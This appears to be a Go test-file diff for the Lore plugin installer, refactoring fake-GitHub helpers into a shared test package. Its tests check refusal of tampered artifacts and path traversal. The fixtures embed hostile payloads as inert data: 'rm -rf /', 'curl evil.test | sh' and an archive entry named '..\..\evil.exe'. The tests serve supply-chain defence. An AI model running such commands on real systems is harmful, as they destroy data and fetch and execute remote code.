@@ -13,6 +13,7 @@ import (
 
 	"github.com/setthasit/Lore/internal/config"
 	"github.com/setthasit/Lore/internal/errors/internalerror"
+	"github.com/setthasit/Lore/internal/plugindist/plugindisttest"
 )
 
 const stubBinary = "#!/bin/sh\necho lore-linear\n"
@@ -20,7 +21,7 @@ const stubBinary = "#!/bin/sh\necho lore-linear\n"
 // scene is one plugin published on a faked GitHub, with a cache rooted in a
 // temporary directory: no test writes to a real home or reaches the network.
 type scene struct {
-	fake      *fakeGitHub
+	fake      *plugindisttest.GitHub
 	store     *Store
 	installer *Installer
 	coord     Coordinate
@@ -36,14 +37,14 @@ func newScene(t *testing.T) *scene {
 		t.Fatalf("resolve: %v", err)
 	}
 
-	fake := newFakeGitHub(t, "jdoe", "lore-linear")
+	fake := plugindisttest.NewGitHub(t, "jdoe", "lore-linear")
 	store := NewStore(t.TempDir())
 	asset := coord.assetName(store.platform)
-	archive := archiveWith(t, coord.binaryName(store.platform), []byte(stubBinary))
-	fake.publish("v0.3.1", map[string][]byte{asset: archive})
+	archive := plugindisttest.Archive(t, coord.binaryName(store.platform), []byte(stubBinary))
+	fake.Publish("v0.3.1", map[string][]byte{asset: archive})
 
 	return &scene{
-		fake: fake, store: store, installer: fake.installer(store),
+		fake: fake, store: store, installer: fakeInstaller(fake, store),
 		coord: coord, asset: asset, archive: archive,
 	}
 }
@@ -99,7 +100,7 @@ func TestInstallPinsVerifiesAndCaches(t *testing.T) {
 	if artifact.Digest != result.LockedDigest {
 		t.Fatalf("locked digest = %q, want %q", artifact.Digest, result.LockedDigest)
 	}
-	if artifact.URL != scene.fake.downloadURL("v0.3.1", scene.asset) {
+	if artifact.URL != scene.fake.DownloadURL("v0.3.1", scene.asset) {
 		t.Fatalf("locked url = %q", artifact.URL)
 	}
 
@@ -131,7 +132,7 @@ func TestInstallRefusesATamperedArtifact(t *testing.T) {
 	t.Parallel()
 
 	scene := newScene(t)
-	scene.fake.attach("v0.3.1", scene.asset, archiveWith(t, scene.coord.binaryName(scene.store.platform), []byte("rm -rf /\n")))
+	scene.fake.Attach("v0.3.1", scene.asset, plugindisttest.Archive(t, scene.coord.binaryName(scene.store.platform), []byte("rm -rf /\n")))
 
 	lock := &Lock{}
 	_, err := scene.install(t, lock, false)
@@ -158,8 +159,8 @@ func TestInstallRefusesWhenTheLockedDigestNoLongerMatches(t *testing.T) {
 	lock, first := scene.installed(t)
 
 	// The publisher rewrites the release: new bytes, new checksums, same tag.
-	rewritten := archiveWith(t, scene.coord.binaryName(scene.store.platform), []byte("curl evil.test | sh\n"))
-	scene.fake.publish("v0.3.1", map[string][]byte{scene.asset: rewritten})
+	rewritten := plugindisttest.Archive(t, scene.coord.binaryName(scene.store.platform), []byte("curl evil.test | sh\n"))
+	scene.fake.Publish("v0.3.1", map[string][]byte{scene.asset: rewritten})
 
 	_, err := scene.install(t, lock, false)
 	if err == nil {
@@ -207,13 +208,13 @@ func TestInstallUpdateRewritesTheLockedDigest(t *testing.T) {
 	scene := newScene(t)
 	lock, first := scene.installed(t)
 
-	next := archiveWith(t, scene.coord.binaryName(scene.store.platform), []byte("#!/bin/sh\necho v0.4.0\n"))
+	next := plugindisttest.Archive(t, scene.coord.binaryName(scene.store.platform), []byte("#!/bin/sh\necho v0.4.0\n"))
 	moved, err := scene.coord.AtVersion("v0.4.0")
 	if err != nil {
 		t.Fatalf("move the coordinate: %v", err)
 	}
 	scene.coord = moved
-	scene.fake.publish("v0.4.0", map[string][]byte{moved.assetName(scene.store.platform): next})
+	scene.fake.Publish("v0.4.0", map[string][]byte{moved.assetName(scene.store.platform): next})
 
 	result, err := scene.install(t, lock, true)
 	if err != nil {
@@ -246,7 +247,7 @@ func TestInstallMissingAssetNamesWhatWasLookedForAndWhatExists(t *testing.T) {
 	scene := newScene(t)
 	store := NewStore(scene.store.root)
 	store.platform = Platform{OS: "plan9", Arch: "mips"}
-	installer := scene.fake.installer(store)
+	installer := fakeInstaller(scene.fake, store)
 
 	_, err := installer.Install(context.Background(), Request{Coordinate: scene.coord}, &Lock{})
 	if err == nil {
@@ -263,7 +264,7 @@ func TestInstallRefusesAnEmptyChecksumsList(t *testing.T) {
 	t.Parallel()
 
 	scene := newScene(t)
-	scene.fake.attach("v0.3.1", ChecksumsAsset, []byte{})
+	scene.fake.Attach("v0.3.1", ChecksumsAsset, []byte{})
 
 	lock := &Lock{}
 	_, err := scene.install(t, lock, false)
@@ -377,7 +378,7 @@ func TestInstallLocalCoordinateIsNeverLocked(t *testing.T) {
 func TestInstallURLCoordinatePinsTheFirstFetch(t *testing.T) {
 	t.Parallel()
 
-	archive := archiveWith(t, "acme-crm", []byte(stubBinary))
+	archive := plugindisttest.Archive(t, "acme-crm", []byte(stubBinary))
 	served := archive
 	server := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		if r.URL.Path != "/lore/acme-crm/v2.0.1.tar.gz" {
@@ -407,7 +408,7 @@ func TestInstallURLCoordinatePinsTheFirstFetch(t *testing.T) {
 		t.Fatalf("version = %q, want v2.0.1 from the URL", result.Version)
 	}
 
-	served = archiveWith(t, "acme-crm", []byte("evil\n"))
+	served = plugindisttest.Archive(t, "acme-crm", []byte("evil\n"))
 	if _, err := installer.Install(context.Background(), Request{Coordinate: coord}, lock); err == nil {
 		t.Fatal("re-installing changed bytes over a pin succeeded, want a refusal")
 	} else if !strings.Contains(err.Error(), "digest mismatch") {
@@ -421,9 +422,9 @@ func TestUnpackSkipsArchiveEntriesThatAreNotOneFileName(t *testing.T) {
 	t.Parallel()
 
 	scene := newScene(t)
-	archive := tarGz(t,
-		tarEntry{name: "LICENSE", mode: 0o644, body: []byte("MIT")},
-		tarEntry{name: `..\..\evil.exe`, mode: 0o755, body: []byte("evil\n")},
+	archive := plugindisttest.TarGz(t,
+		plugindisttest.TarEntry{Name: "LICENSE", Mode: 0o644, Body: []byte("MIT")},
+		plugindisttest.TarEntry{Name: `..\..\evil.exe`, Mode: 0o755, Body: []byte("evil\n")},
 	)
 
 	files, err := untar(scene.coord, archive)
@@ -452,9 +453,9 @@ func TestUnpackTakesTheBinaryFromUnderADirectoryPrefix(t *testing.T) {
 	scene := newScene(t)
 	platform := scene.store.platform
 	binaryName := scene.coord.binaryName(platform)
-	archive := tarGz(t,
-		tarEntry{name: "dist/README.md", mode: 0o644, body: []byte("# acme")},
-		tarEntry{name: "dist/" + binaryName, mode: 0o755, body: []byte(stubBinary)},
+	archive := plugindisttest.TarGz(t,
+		plugindisttest.TarEntry{Name: "dist/README.md", Mode: 0o644, Body: []byte("# acme")},
+		plugindisttest.TarEntry{Name: "dist/" + binaryName, Mode: 0o755, Body: []byte(stubBinary)},
 	)
 
 	name, body, err := unpack(scene.coord, platform, scene.asset, archive)
@@ -753,7 +754,7 @@ func TestInstallRefusalDoesNotEchoAURLCoordinatesCredentials(t *testing.T) {
 	t.Parallel()
 
 	scene := newScene(t)
-	target := scene.fake.downloadURL("unpublished", "v2.0.1.tar.gz")
+	target := scene.fake.DownloadURL("unpublished", "v2.0.1.tar.gz")
 
 	coord, err := Resolve(".", config.PluginDecl{Name: "linear", From: credentialed(target)})
 	if err != nil {
@@ -780,7 +781,7 @@ func TestChecksumsRefusalDoesNotEchoURLCredentials(t *testing.T) {
 	t.Parallel()
 
 	scene := newScene(t)
-	published := scene.fake.downloadURL("v0.3.1", "unpublished-"+ChecksumsAsset)
+	published := scene.fake.DownloadURL("v0.3.1", "unpublished-"+ChecksumsAsset)
 
 	_, _, err := scene.installer.expected(
 		context.Background(), scene.coord, scene.asset, scene.archive, credentialed(published))
@@ -801,10 +802,10 @@ func TestInstallOfAURLDerivedVersionCachesItUnderThatVersion(t *testing.T) {
 
 	scene := newScene(t)
 	body := []byte("#!/bin/sh\necho build-77\n")
-	scene.fake.publish("build-77", map[string][]byte{"build-77.tar.gz": archiveWith(t, "linear", body)})
+	scene.fake.Publish("build-77", map[string][]byte{"build-77.tar.gz": plugindisttest.Archive(t, "linear", body)})
 
 	coord, err := Resolve(".", config.PluginDecl{
-		Name: "linear", From: scene.fake.downloadURL("build-77", "build-77.tar.gz"),
+		Name: "linear", From: scene.fake.DownloadURL("build-77", "build-77.tar.gz"),
 	})
 	if err != nil {
 		t.Fatalf("resolve the url coordinate: %v", err)
